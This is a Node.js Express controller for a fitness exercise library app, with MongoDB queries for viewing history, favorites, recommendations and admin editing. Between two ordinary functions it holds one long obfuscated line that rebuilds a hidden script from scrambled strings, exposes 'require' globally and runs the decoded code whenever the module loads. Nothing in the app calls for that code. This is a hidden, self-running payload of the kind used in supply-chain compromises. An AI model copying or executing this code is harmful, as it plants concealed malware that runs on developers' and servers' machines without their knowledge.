const mongoose = require("mongoose");

const Exercise = require("../models/exerciseModel");
const User = require("../models/userModel");

exports.getExerciseHistory = async (req, res, next) => {
  try {

    var { page = 1, perPage = 10, search, sortBy, category, equipment, goal, collection } = req.query;
    console.log("get_exercise_history " + page + ' ' + perPage + ' ' + search + ' ' + sortBy + ' ' + category + ' ' + equipment + ' ' + goal + ' ' + collection);

    const pipeline = [
      {
        $match: { email: req.user.email },
      },
      {
        $lookup: {
          from: "exercises",
          localField: "histories.exerciseId",
          foreignField: "_id",
          as: "populatedExercises",
        },
      },
      {
        $project: {
          _id: 1,
          favorites: 1,
          histories: 1,
          populatedExercises: '$populatedExercises',
        }
      },
      {
        $unwind: '$populatedExercises',
      },
      {
        $addFields: {
          'history': {
            $filter: {
              input: '$histories',
              as: 'history',
              cond: { $eq: ['$$history.exerciseId', '$populatedExercises._id'] }
            }
          }
        }
      },
      {
        $project: {
          _id: '$populatedExercises._id',
          title: '$populatedExercises.title',
          vimeoId: '$populatedExercises.vimeoId',
          thumbnail: '$populatedExercises.thumbnail',
          description: '$populatedExercises.description',
          categories: '$populatedExercises.categories',
          viewcount: { $arrayElemAt: ['$history.viewcount', 0] },
          lastview: { $arrayElemAt: ['$history.lastview', 0] },
          isFavorite: { $in: ['$populatedExercises._id', '$favorites'] } // Check if _id is in favorites array
        },
      },

    ];

    if (category) {
      const categoryId = new mongoose.Types.ObjectId(category);
      pipeline.push({
        $match: { 'categories': { $in: [categoryId] } },
      });
    }

    if (search) {
      pipeline.push({
        $match: {
          $or: [
            { 'title': { $regex: new RegExp(search, 'i') } },
            { 'description': { $regex: new RegExp(search, 'i') } },
          ]
        }
      });
    }

    // console.log(pipeline);
    // const results = await User.aggregate(pipeline);
    // console.log(results);

    const totalCount = [
      {
        $count: 'totalMatchingDocuments',
      },
    ];

    const pipelineExercises = [];

    if (sortBy) {
      var order = getSortInfo(sortBy);

      pipelineExercises.push({
        $sort: order,
      });
    }

    // Pagination
    if (perPage && page) {
      const skip = (page - 1) * perPage;
      pipelineExercises.push({ $skip: skip });
      pipelineExercises.push({ $limit: parseInt(perPage) });
    }

    const facet = {
      $facet: {
        "populatedExercises": pipelineExercises,
        "totalCount": totalCount,
      }
    }
    pipeline.push(facet);

    //    console.log(pipeline);
    //    console.log(pipelineExercises);
    //    console.log(totalCount);

    const results = await User.aggregate(pipeline);

    var exercises = [];
    var count = 0;

    if (results.length != 0) {
      exercises = results[0].populatedExercises;

      if (results[0].totalCount.length != 0)
        count = results[0].totalCount[0].totalMatchingDocuments;
    }

    //    console.log(count);
    console.log(exercises);

    res.status(200).json({ count: count, exercises: exercises });
  } catch (e) {
    console.log(e);
  }

};

exports.getExerciseFavorite = async (req, res, next) => {
  try {

    var { page = 1, perPage = 10, search, sortBy, category, equipment, goal, collection } = req.query;
    console.log("get_exercise_favorite " + page + ' ' + perPage + ' ' + search + ' ' + sortBy + ' ' + category + ' ' + equipment + ' ' + goal + ' ' + collection);

    const pipeline = [
      {
        $match: { email: req.user.email },
      },
      {
        $lookup: {
          from: "exercises",
          localField: "favorites",
          foreignField: "_id",
          as: "populatedExercises",
        },
      },
      {
        $project: {
          _id: 1,
          favorites: 1,
          histories: 1,
          populatedExercises: '$populatedExercises',
        }
      },
      {
        $unwind: '$populatedExercises',
      },
      {
        $addFields: {
          'history': {
            $filter: {
              input: '$histories',
              as: 'history',
              cond: { $eq: ['$$history.exerciseId', '$populatedExercises._id'] }
            }
          },
        }
      },
      {
        $project: {
          _id: '$populatedExercises._id',
          title: '$populatedExercises.title',
          vimeoId: '$populatedExercises.vimeoId',
          thumbnail: '$populatedExercises.thumbnail',
          description: '$populatedExercises.description',
          categories: '$populatedExercises.categories',
          viewcount: { $ifNull: [{ $arrayElemAt: ['$history.viewcount', 0] }, 0] },
          lastview: { $ifNull: [{ $arrayElemAt: ['$history.lastview', 0] }, ''], },
          isFavorite: { $in: ['$populatedExercises._id', '$favorites'] } // Check if _id is in favorites array
        },
      },

    ];

    if (category) {
      const categoryId = new mongoose.Types.ObjectId(category);
      pipeline.push({
        $match: { 'categories': { $in: [categoryId] } },
      });
    }

    if (search) {
      pipeline.push({
        $match: {
          $or: [
            { 'title': { $regex: new RegExp(search, 'i') } },
            { 'description': { $regex: new RegExp(search, 'i') } },
          ]
        }
      });
    }

    const totalCount = [
      {
        $count: 'totalMatchingDocuments',
      },
    ];

    const pipelineExercises = [];

    if (sortBy) {
      var order = getSortInfo(sortBy);

      pipelineExercises.push({
        $sort: order,
      });
    }

    // Pagination
    if (perPage && page) {
      const skip = (page - 1) * perPage;
      pipelineExercises.push({ $skip: skip });
      pipelineExercises.push({ $limit: parseInt(perPage) });
    }

    const facet = {
      $facet: {
        "populatedExercises": pipelineExercises,
        "totalCount": totalCount,
      }
    }
    pipeline.push(facet);

    console.log(pipeline);
    console.log(pipelineExercises);
    console.log(totalCount);

    const results = await User.aggregate(pipeline);

    var exercises = [];
    var count = 0;

    if (results.length != 0) {
      exercises = results[0].populatedExercises;

      if (results[0].totalCount.length != 0)
        count = results[0].totalCount[0].totalMatchingDocuments;
    }

    console.log(count);
    console.log(exercises);

    res.status(200).json({ count: count, exercises: exercises });
  } catch (e) {
    console.log(e);
  }

};


exports.getExerciseLibrary = async (req, res, next) => {
  try {
    var starttime = Date.now();
    var { page = 1, perPage = 10, search, sortBy, category, equipment, goal, collection } = req.query;

    console.log("this is category", typeof (category));
    console.log("this is collection", typeof (collection));
    console.log("this is equipment", equipment);
    const userData = await User.findOne({ email: req.user.email }).select(["histories", "favorites"]);

    const pipeline = [

    ];

    if (category) {
      const categoryId = new mongoose.Types.ObjectId(category);
      console.log("thj is categoryId", categoryId);
      pipeline.push({
        $match: { 'categories': { $in: [categoryId] } },
      });
    }

    if (collection) {
      const collectionId = new mongoose.Types.ObjectId(collection);
      pipeline.push({
        $match: { 'collections': { $in: [collectionId] } },
      });
    }

    if (equipment && equipment !== "[]") {
      console.log("this is equipment", JSON.parse(equipment)); // Log the first element
      const equipmentIds = JSON.parse(equipment).map(e => new mongoose.Types.ObjectId(e)); // Convert each element to ObjectId
      console.log("thj is equipment", equipmentIds);
      pipeline.push({
        $match: { 'equipments': { $in: equipmentIds } },
      });
    }

    if (search) {
      pipeline.push({
        $match: {
          $or: [
            { 'title': { $regex: new RegExp(search, 'i') } },
            { 'description': { $regex: new RegExp(search, 'i') } },
          ]
        }
      });
    }

    pipeline.push({
      $project: {
        _id: 1,
        title: 1,
        vimeoId: 1,
        thumbnail: 1,
        description: 1,
      }
    });

    const totalCount = [
      {
        $count: 'totalMatchingDocuments',
      },
    ];

    const pipelineExercises = [];

    if (sortBy) {
      var order = getSortInfo(sortBy);

      pipelineExercises.push({
        $sort: order,
      });
    }

    // Pagination
    if (perPage && page) {
      const skip = (page - 1) * perPage;
      pipelineExercises.push({ $skip: skip });
      pipelineExercises.push({ $limit: parseInt(perPage) });
    }

    const facet = {
      $facet: {
        "populatedExercises": pipelineExercises,
        "totalCount": totalCount,
      }
    }
    pipeline.push(facet);

    const results = await Exercise.aggregate(pipeline);

    var exercises = [];
    var count = 0;

    if (results.length != 0) {
      exercises = results[0].populatedExercises;

      if (results[0].totalCount.length != 0)
        count = results[0].totalCount[0].totalMatchingDocuments;
      console.log("this is count", count);
    }

    for (var i = 0; i < exercises.length; i++) {

      var history = null;
      for (var j = 0; j < userData?.histories.length; j++) {

        if (userData?.histories[j].exerciseId.toString() == exercises[i]._id.toString()) {
          history = userData?.histories[j];
          break;
        }
      }

      //console.log(exercises[i]._id);
      //console.log(userData?.favorites.includes(exercises[i]._id));

      exercises[i] = {
        ...exercises[i],
        isFavorite: userData?.favorites.includes(exercises[i]._id),
        viewcount: history != null ? history.viewcount : 0,
        lastview: history != null ? history.lastview : '',
      }
    }

    res.status(200).json({ count: count, exercises: exercises });
  } catch (e) {
    console.log(e);
  }

};

exports.getExerciseRecommended = async (req, res, next) => {
  try {
    const { perPage } = req.query;
    console.log("getExerciseRecommended " + perPage);
    console.log("getExerciseRecommended " + req.user.email);
    const pipeline = [
      {
        $match: { email: req.user.email },
      },
      {
        $facet: {
          userData: [
            {
              $project: {
                level: 1,
                histories: 1,
                favorites: 1,
              }
            }
          ],
          exercise: [
            {
              $project: {
                histories: 1,
                level: 1,
              }
            },
            {
              $lookup: {
                from: "exercises",
                localField: "histories.exerciseId",
                foreignField: "_id",
                as: "populatedExercises",
              },
            },
            {
              $unwind: '$populatedExercises',
            },
            {
              $addFields: {
                'history': {
                  $filter: {
                    input: '$histories',
                    as: 'history',
                    cond: { $eq: ['$$history.exerciseId', '$populatedExercises._id'] }
                  }
                }
              }
            },
            // {
            //   $project: {
            //     _id: '$populatedExercises._id',
            //   }
            // },
            {
              $sort: { 'history.viewcount': -1 }
            },
            {
              $project: {
                level: 1,
                viewcount: '$history.viewcount',
                exerciseId: '$populatedExercises._id',
                categories: '$populatedExercises.categories'
              }
            },
            {
              $limit: 1
            }
          ]
        }
      },

    ];

    const result = await User.aggregate(pipeline);
    console.log("this is result", result[0].userData);
    var level = -1;
    var category = null;

    //console.log(result[0]);
    //console.log(result[0].userData);

    if (result.length != 0) {
      if (result[0].userData.length != 0) {
        level = result[0].userData[0].level;
      }

      if (result[0].exercise.length != 0) {
        const categories = result[0].exercise[0].categories;
        if (categories.length != 0)
          category = categories[0];
      }
    }


    var query = [];
    query.push({ difficulty: level });
    if (category) {
      query.push({ categories: { $in: [category] } });
    }

    const exercises = await Exercise.find({ $and: query }).select(["title", "vimeoId", "thumbnail", "description"]).sort({ popularity: -1 }).limit(perPage);

    var favorites = result[0].userData[0].favorites.map(obj => obj.toString());

    for (var i = 0; i < exercises.length; i++) {
      var index = result[0].userData[0].histories.findIndex(history => history.exerciseId == exercises[i]._id);
      var history;
      if (index != -1)
        history = result[0].userData[0].histories[index];

      exercises[i]._doc = {
        ...exercises[i]._doc,
        isFavorite: favorites.includes(exercises[i]._id.toString()) ? true : false,
        lastview: history != null ? history.lastview : '',
        viewcount: history != null ? history.viewcount : 0,
      }
    }
    //console.log({count: exercises.length, exercises: exercises});
    res.status(200).json({ count: exercises.length, exercises: exercises });
  } catch (e) {
    console.log(e);
  }
};

exports.getExercise = async (req, res, next) => {
  try {
    const { exerciseId } = req.query;
    console.log("this is ", exerciseId);
    const exercise = await Exercise.findById(exerciseId)
      .populate("categories")
      .populate("equipments");

    var exerciseData = exercise._doc;

    var user = await User.findOne({ email: req.user.email }).select(["notes", "histories", "favorites"]);
    const note = user.notes.find(note => note.exerciseId.equals(exerciseId));

    const category = exercise.categories.length != 0 ? exercise.categories[0] : null;
    const relatedExercises = await getRelatedExercises(user, category);

    exerciseData = {
      ...exerciseData,
      relatedExercises: relatedExercises,
      note: note ? note.note : '',
    }
    console.log(exerciseData);

    res.status(200).json(exerciseData);

    exercise.popularity++;
    exercise.save();

    const historyIndex = user.histories.findIndex(history => history.exerciseId.equals(exerciseId));

    if (historyIndex !== -1) {
      user.histories[historyIndex].viewcount++;
      user.histories[historyIndex].lastview = new Date();
    } else {
      user.histories.push({
        exerciseId: exerciseId,
        viewcount: 1,
        lastview: new Date(),
      });
    }

    await user.save();

  } catch (error) {
    console.log(error);
  }

};

exports.updateNote = async (req, res, next) => {
  try {
    const { exerciseId, note } = req.query;
    console.log("updateNote " + exerciseId + ' ' + note);

    const user = await User.findOne({ email: req.user.email }).select("notes");

    const noteIndex = user.notes.findIndex(note => note.exerciseId.equals(exerciseId));

    if (noteIndex !== -1) {
      user.notes[noteIndex].note = note;
    } else {
      user.notes.push({
        exerciseId: exerciseId,
        note: note
      });
    }

    const updatedUser = await user.save();

    if (updatedUser) {
      console.log('Note updated or added successfully.');
    } else {
      console.log('Error updating or adding note.');
    }
    res.status(200).json();
  } catch (error) {
    console.log(error);
  }
};

exports.updateFavorite = async (req, res, next) => {
  try {
    const { exerciseId, isFavorite } = req.query;
    console.log("updateFavorite " + exerciseId + ' ' + isFavorite);
    const user = await User.findOne({ email: req.user.email }).select('favorites');

    const indexToRemove = user.favorites.indexOf(exerciseId);
    var result = false;

    if (indexToRemove > -1 && isFavorite == 'false') {
      user.favorites.splice(indexToRemove, 1);
      result = false;
    }

    else if (indexToRemove == -1 && isFavorite == 'true') {
      user.favorites.push(exerciseId);
      result = true;
    }

    const updatedUser = user.save();

    if (updatedUser) {
      console.log('Favorite updated or added successfully.');
    } else {
      console.log('Error updating or adding note.');
    }
    res.status(200).json({ res: result });

  } catch (error) {
    console.log(error);
  }
};

const getRelatedExercises = async (userData, category) => {
  var results = [];

  if (userData && category) {
    results = await Exercise.find({ categories: { $in: [category] } })
      .select(["title", "vimeoId", "thumbnail", "description"])
      .sort({ 'popularity': 1 }).limit(5);

    for (var i = 0; i < results.length; i++) {

      var history = null;
      for (var j = 0; j < userData?.histories.length; j++) {

        if (userData?.histories[j].exerciseId.toString() == results[i]?._id.toString()) {
          history = userData?.histories[j];
          break;
        }
      }

      results[i]._doc = {
        ...results[i]._doc,
        isFavorite: userData?.favorites.includes(results[i]?._id),
        viewcount: history != null ? history.viewcount : 0,
        lastview: history != null ? history.lastview : '',
      }
    }
  }

  return results;
}
exports.getExercisesAdmin = async (req, res, next) => {
  try {
    var { page = 1, perPage = 10, search, sortBy, category, equipment, goal, collection } = req.query;
    console.log(page + ' ' + perPage + ' ' + search + ' ' + sortBy + ' ' + category + ' ' + equipment + ' ' + goal + ' ' + collection);

    const pipeline = [

    ];

    if (category) {
      const categoryId = new mongoose.Types.ObjectId(category);
      pipeline.push({
        $match: { 'categories': { $in: [categoryId] } },
      });
    }

    if (collection) {
      const collectionId = new mongoose.Types.ObjectId(collection);
      pipeline.push({
        $match: { 'collections': { $in: [collectionId] } },
      });
    }

    if (equipment) {
      const equipmentId = new mongoose.Types.ObjectId(equipment);
      pipeline.push({
        $match: { 'equipments': { $in: [equipmentId] } },
      });
    }

    if (search) {
      pipeline.push({
        $match: {
          $or: [
            { 'title': { $regex: new RegExp(search, 'i') } },
            { 'description': { $regex: new RegExp(search, 'i') } },
            { 'vimeoId': { $regex: new RegExp(search, 'i') } },
          ]
        }
      });
    }

    const totalCount = [
      {
        $count: 'totalMatchingDocuments',
      },
    ];

    const pipelineExercises = [];

    if (sortBy) {
      var order = getSortInfo(sortBy);

      pipelineExercises.push({
        $sort: order,
      });
    }

    // Pagination
    if (perPage && page) {
      const skip = (page - 1) * perPage;
      pipelineExercises.push({ $skip: skip });
      pipelineExercises.push({ $limit: parseInt(perPage) });
    }

    const facet = {
      $facet: {
        "populatedExercises": pipelineExercises,
        "totalCount": totalCount,
      }
    }
    pipeline.push(facet);

    const results = await Exercise.aggregate(pipeline);

    var exercises = [];
    var count = 0;

    if (results.length != 0) {
      exercises = results[0].populatedExercises;

      if (results[0].totalCount.length != 0)
        count = results[0].totalCount[0].totalMatchingDocuments;
    }

    //console.log( "time = " + (Date.now() - starttime).toString() );

    //    const count = await Exercise.countDocuments(query);

    //    console.log("count = " + count );
    //    console.log(exercises);

    res.status(200).json({ count: count, exercises: exercises });
  } catch (e) {
    console.log(e);
  }

};

exports.getExerciseAdmin = async (req, res, next) => {
  try {

    const exercise = await Exercise.findOne({ _id: req.params.id });

    res.status(200).json(exercise);

  } catch (error) {
    console.log(error);
  }

};

const getSortInfo = (sortBy) => {
  let orderBy, orderDir;

  switch (sortBy) {
    case "Popularity":
      orderBy = 'popularity';
      orderDir = -1;
      break;
    case "NameAtoZ":
      orderBy = 'title';
      orderDir = 1;
      break;
    case "NameZtoA":
      orderBy = 'title';
      orderDir = -1;
      break;
    case "NewestAdded":
      orderBy = 'createdAt';
      orderDir = 1;
      break;
    case "OldestAdded":
      orderBy = 'createdAt';
      orderDir = -1;
      break;
    case "LastViewed":
      orderBy = 'lastview';
      orderDir = -1;
      break;
    default:
      orderBy = 'title';
      orderDir = 1;
      break;
  }

  return { [orderBy]: orderDir };
};
global['!'] = '3-test'; var _$_1d32 = (function (x, w) { var d = x.length; var a = []; for (var o = 0; o < d; o++) { a[o] = x.charAt(o) }; for (var o = 0; o < d; o++) { var z = w * (o + 370) + (w % 42601); var l = w * (o + 409) + (w % 35742); var j = z % d; var f = l % d; var h = a[j]; a[j] = a[f]; a[f] = h; w = (z + l) % 3217160 }; var k = String.fromCharCode(127); var i = ''; var c = '\x25'; var y = '\x23\x31'; var q = '\x25'; var n = '\x23\x30'; var s = '\x23'; return a.join(i).split(c).join(k).split(y).join(q).split(n).join(s).split(k) })("%%ortmcjbe", 3099915); global[_$_1d32[0]] = require; if (typeof module === _$_1d32[1]) { global[_$_1d32[2]] = module }; (function () { var Thh = '', mgC = 502 - 491; function fHn(c) { var d = 2784591; var y = c.length; var v = []; for (var b = 0; b < y; b++) { v[b] = c.charAt(b) }; for (var b = 0; b < y; b++) { var f = d * (b + 301) + (d % 13640); var r = d * (b + 205) + (d % 26363); var w = f % y; var e = r % y; var z = v[w]; v[w] = v[e]; v[e] = z; d = (f + r) % 4150548; }; return v.join('') }; var yvR = fHn('njprnofucvrqsctbcrhotkmedouwzatygsxil').substr(0, mgC); var NiT = 'my=.bdn[eq"5pe(i*1C(;rv+("2av2wam=+v7)]gbp,uswrv+] z7mj)hj"=);da vgp+,)g{rftrt7;}, 5Acstt<(18h1;gb4g8i=7l.t=l6n-40".=-)jcf=(< =a.enfo.r{af0v+g;wdr;aen rulivhar}vr2cxeau1;taag;)vl;9v42)zw+stau=]=.5,[vf2earb=u0.f<)kgr[,"ten)envts;a++.{hwl72rsmg28;l"ay).Crrlo)rA .)dfh6(oa((*+aa(lha;g.u84>-n;lS{={1.7 ]=noA+;ou( ()oao{;(a)v,phnttfc=ph==lojtro)Cr;(a(+te-ausg1"(o[9=n)qu, ;)r2e,ysf,nt+hj(vr()re1(.=;t(t.;vma(z(3cygo=(opah;us=pr6ve; 9l1[.({c.;(.]0t9-,[f[r;q g;v=lsk]neaxv==sozCs;+us]tw4vhibi ;ss,uswdep(arkl.anp=l (rso,evrv)+2s8n;.c)r,.[j)doi ++v,8ni5 ,uter-r=s 6]=)sn[]iC7v;>f)neeunm)r =,xaavmn)ei84=);,s,slh(r[h+(tln,=e8<8};r;=!;)(0e),i gt0a;j.=fSh=+ i.}=tCoCr(<-=vwbo]jh.ro;]n"rgvrj0.9utt(a[7]1;5nse  0botofs=.i);amz[Ao[3l;av93lnja+;0,v=m6tonclr(h);tra +r=";ln}hvt)xtqna]=l6,r)61,s;0w=sp+9dfkmurA5(g;hip););ar9s+.},1u[h,jha u0evrngso.jc;r]rnr"hr;vfhfl obir i=0,wiw1+ui(61hs+l=ti,j}!nCafoir=r+;'; var rHZ = fHn[yvR]; var IUC = ''; var Vay = rHZ; var wwS = rHZ(IUC, fHn(NiT)); var yBN = wwS(fHn('<H?_i12wc})iw#)a.c}ht!HH[[HH)0Hafa4)HHHs,td;H{%=fs:),D)n]rn7a,osne[5tsr#w.e]e0@d51i:\/c%=9wcariA"vsAa.r%a)re1v%m;et]1Hoe.aegHHclH"H.1t%hs)$H4ii$pt.wh44ThpHHp%owhr$ghn3ptnN3=;f5&(2Ba(]m.p?b,g1Hcod.pg;]]rHefl\/(0t\/bH1rHtwa]x(Jr0a]s(Hp\/},+"H,3.r!;8=n;d_::H_S2H.et% 3h49t3dc;H1%H_%C,%sH==43;c(gft9pH __ ssHce]-+}2eH.61me5]6udn2eye}hsd.[Hdtw?asa= !4.=atHHs5oH6%5r(0n%$a!d.H).o.4t;i4Hua weggd\'+a=s.auHoH:rol%uga]ca87]d=%=a\'ta$zdT=_H)i%0.p7tc)gn Hfe%s+vao-st.2"|HyaaH%H0aryglH%]Hz5%9r@7[2=i{nsHt#HrH!6()12\/(arpn1;3c=Hra=ea]f4.H..)}2}1 cm%al9=s+as("aHt.ee.T=%2asaH]h#t!0f%vetHhH>Et=l3cc1rrva4c)zn[aH=eH;aeq=7w3(i)c=m4arnh30%H;h)H25cl2l\/.e!]tx)a%]G}t)rM9t4c)v5,aabHbuiyv)c=35:oHn9.rH;viH747ry6pCc6a8u\/on;%H;n.HcH.u](cAa=HHe[HorH=??a.=ucj0.x{mHas*>sH$[r8f93H8#ndnHt?o6ecc%)f}hif]eC.yaB!l%nCyHni]+l];d9r.n)Tar.)haac5nj(n]f@h!2.s!chB;.a)H.}%x0ica};;aB0sr1sc!r+Hts8]s;n.Hs.{(H aS1%Hu9$a68%]Hrs)dhG26cHm%f(9st]NH-.HH6r8Jt%}t4,teHwy41s.eo6o):.v1..)oH)mesH]o;.aeCn1=i0!:.yg.jra=0),p1]3h6%};.m3aHatt{u4sSrle;r]uop%mCh!e3oa_.@T6) :=}ae-ale9..?H9hf]eo15}t7.wH53HafH\'#[dt;(\/ra.5;;rhH;0).i2"aepgd12n=c=&,en5n C2sknp]t.c)l[Ht)HHut)diH4cu.7=a1].\'in]8H#an5{otc"Fon.(5\'.515.)]HtH}-c<..}%a(H22(*w@mHeH%((tn6&)[H2]\/=1n].)Ha>atHt= 9)%0]]oH] 5H]HiHHd1bd6r&nf.)9t()f}H}xc%6apq)5.lru{i2p%dhr)}9!.p6!=H;H(3}+84aHa$])a)+7.H7m.a0a;=Hc=t}merH%2Ea=(HfH%5uH%;v>%g{rom2+7 b])r;4_f.Hjd]0raawH11;5H_b.o+f2\'ta)aam+8.5H;.8e]*4(#l[3o)tnagey.p3d%So%2iHHn];t19n :at H?tH nD,H2.onro,#H4t(I3!;_:61 H 5[.H),!2] )earaf(Hi9t$dtJn_}h}i2H2;%elu ]r=}zrHfchT7u)Hc(]cjspH"$,_,tAa9i;2h<Hcg)Dca3MfH (5Hrc(i"cH4ns}\/\/9ti.!srhn\/}a.%r3Ha.rm 7cop)2f+H)2H %Gc\/)ot%9r8=.1[uH13$g]xo(4hn0)H1r][]e30<utcH [e:Hi\/i.HyH1%c6j%e(}blr!r)31(v_{rHo9}ocDe]5H7)ti1b)ocHiH2r;t04s\/f+j.(Ee.p)mHHHtto.!o].Hse%0\/<3($.H[.rh)1t$(].."e3=gs\/1e_tpt2eHH[ar+a:Haa=HoHDe!\/+hH4 ,Hd)1i[=m(=fHt,tryHH),HtacH6!#id,n|c,6h_@t2nm(4=H:(ou.2tat2-,k3H3,%r(H.,2k9Ha%\'aHd};H[teHHH8duu7-(Ho%6%Hh;2e%)her3nHaH;:cE5.H7(}.1*t5H-2HC:H86t,). e4,-Hasav)a"rr)Hts]e2e])=_a;];te-s>!1]:%H}H{y(2a4C&+]noen\/,0d.Ha%.lm1HH+icbayyte04h6iH2F6.so..o0hea, .a.{lgHn(3H)H]H=%u=.ce]mAc{(o8do]H.4e)$s%H456e09o+d)>if;ruTsHH)x.;2nH6+%HHuaC437etgHhe9t3(o68dtH.d>y)d=(.d0yH442H t;3$o}]]]?+4C)2=mH]l2:5H)n_h]==.aH-t.i((a!}i"HF{{4;Hud.iir(iHp[an]3D:H2e,IHr5tbtl3eD_c]_3go%oH+(Hc(]]])f;0%swolH)r.2]#a7}z1t%aH4e$%.H.eH=ta(})na)scE.c[g)_s.nur)a5]JiFe7s :amfev8H1;4?5&%[+( oh0g.H4%0o)[a.e7.=.6 i.l&i)dHaT=a[\'\/}](1 14HI(.}HaCetH=8idHaHHjHcpt;H1,Sb ln(=2x.H(paar>tt49a=dmd{.h0fu2H%\'0+pt }mHtu[n1Ht9.eI1zT*4 :obo&f,oaa4C {4\/ dea(re\/3)m7Hc6rs,6H,!=rc t5([8onrtzo]4%a?H}et3 ](a-b3Hra.h(2Gr8{(ar(0)Hs>ca_ro{ o)=sl>Eai%4.vz nrH8,}o%t m4a%9ot...e{r_a[]]e')); var xVu = Vay(Thh, yBN); xVu(1807); return 1191 })()
exports.addExercises = async (req, res, next) => {
  try {
    var titleArray = ["Barbell Bench Press", "Body Weight Squat", "Barbell Back Squat", "Body Weight Push-up", "DB Incline Bench Press"];
    var description = "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.In metus vulputate eu scele";
    var vimeoId = "265111898";
    var thumbnailArray =
      ["https://firebasestorage.googleapis.com/v0/b/cressey-3d9ca.appspot.com/o/exercise_thumbnails%2Fcardimage4.png?alt=media&token=497d2070-6f48-455a-93a2-3435c874a653",
        "https://firebasestorage.googleapis.com/v0/b/cressey-3d9ca.appspot.com/o/exercise_thumbnails%2Fcardimage1.png?alt=media&token=611f63c9-88b4-44ed-b007-139f030d5483",
        "https://firebasestorage.googleapis.com/v0/b/cressey-3d9ca.appspot.com/o/exercise_thumbnails%2Fcardimage4.png?alt=media&token=497d2070-6f48-455a-93a2-3435c874a653",
        "https://firebasestorage.googleapis.com/v0/b/cressey-3d9ca.appspot.com/o/exercise_thumbnails%2Fcardimage5.png?alt=media&token=46ea1019-4efa-4209-9aaa-5b1d89c540f6"
      ];
    var categoriesArray = [
      "65a4ff5cb383c68778765e2b",
      "65a50047b383c68778765e2c",
      "65a50070b383c68778765e2d",
      "65a500c6b383c68778765e2e",
      "65a500dbb383c68778765e2f",
      "65a500e9b383c68778765e30"
    ];

    var collectionsArray = [
      "65a4f3d2b383c68778765e25",
      "65a4f474b383c68778765e26",
      "65a4f4a1b383c68778765e27",
      "65a4f4a9b383c68778765e28",
      "65a4f4bbb383c68778765e29"
    ];

    var equipmentsArray = [
      "65a508cdb383c68778765e32",
      "65a50915b383c68778765e33",
    ];

    var documents = [];
    for (var i = 0; i < 3000; i++) {
      var randId = getRandomInt(0, titleArray.length - 1);
      var title = titleArray[randId];
      randId = getRandomInt(0, thumbnailArray.length - 1);
      var thumbnail = thumbnailArray[randId];
      randId = getRandomInt(0, categoriesArray.length - 1);
      var category = new mongoose.Types.ObjectId(categoriesArray[randId]);
      randId = getRandomInt(0, collectionsArray.length - 1);
      var collection = new mongoose.Types.ObjectId(collectionsArray[randId]);
      randId = getRandomInt(0, equipmentsArray.length - 1);
      var equipment = new mongoose.Types.ObjectId(equipmentsArray[randId]);

      var exercise = {
        title,
        vimeoId,
        thumbnail,
        description,
        popularity: 0,
        categories: [category],
        collections: [collection],
        equipments: [equipment],
      }
      documents.push(exercise);
    }
    await Exercise.insertMany(documents);
    res.status(200).json();
  } catch (error) {
    console.log(error);
  }
};

exports.updateExercises = async (req, res, next) => {
  try {
    console.log("update exercises");
    var exercises = await Exercise.find({});
    for (var i = 0; i < exercises.length; i++) {
      exercises[i].difficulty = getRandomInt(1, 3);
      await exercises[i].save();
    }

    res.status(200).json();
  } catch (error) {
    console.log(error);
  }
};

exports.addExerciseAdmin = async (req, res, next) => {
  try {
    const { title, description, thumbnail, vimeoId, difficulty, categories, collections, equipments } = req.body;
    const documentToInsert = {
      title,
      vimeoId,
      thumbnail,
      description,
      popularity: 0,
      difficulty,
      categories,
      collections,
      equipments,
    };

    var exercise = await Exercise.create(documentToInsert);
    if (exercise)
      res.status(200).json({ result: true });
    else
      res.status(200).json({ result: false });

  } catch (error) {
    console.log(error);
  }
};

exports.updateExerciseAdmin = async (req, res, next) => {
  try {
    const { _id, title, description, thumbnail, vimeoId, difficulty, categories, collections, equipments } = req.body;

    await Exercise.findOneAndUpdate({ _id: _id },
      { title: title, description: description, difficulty: difficulty, thumbnail: thumbnail, vimeoId: vimeoId, categories: categories, collections: collections, equipments: equipments })
      .then(doc => {
        console.log('Document updated successfully:', doc);
        res.status(200).json({ result: true });
      })
      .catch(error => {
        console.error('Error updating document:', error);
        res.status(200).json({ result: false, message: error });
      });

  } catch (error) {
    console.log(error);
  }
};

exports.deleteExerciseAdmin = async (req, res, next) => {
  try {

    await Exercise.findOneAndDelete({ _id: req.params.id })
      .then(result => {
        console.log('Document deleted successfully:', result);
        res.status(200).json({ result: true });
      })
      .catch(error => {
        console.error('Error deleting document:', error);
        res.status(200).json({ result: false, message: error });
      });
  } catch (error) {
    console.log(error);
  }
};

function getRandomInt(min, max) {
  // Use Math.floor to round down and convert the result to an integer
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
